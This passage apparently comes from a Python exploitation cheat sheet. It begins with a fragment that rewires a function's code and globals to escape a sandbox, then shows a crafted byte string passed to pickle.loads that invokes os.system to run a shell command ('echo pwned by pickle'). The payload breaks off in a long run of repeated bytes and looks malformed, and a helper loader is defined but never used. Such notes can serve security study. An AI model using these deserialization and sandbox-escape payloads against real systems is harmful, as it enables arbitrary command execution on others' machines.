fn = lambda: None
gi = (i for i in ())
fn.__code__ = code
fn.__globals__ = gi
del i
fn()
```

##### `pickle.loads`

```python
import pickle
import string

safe_modules = {'string': string}

def insecure_loader(module_name):
    if module_name in safe_modules:
        return safe_modules[module_name]
    raise ImportError('Module not found: %s' % module_name)

pickle.loads(b'cos\nsystem\n(S\x16\x00\x00\x00echo pwned by pickle\n\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85
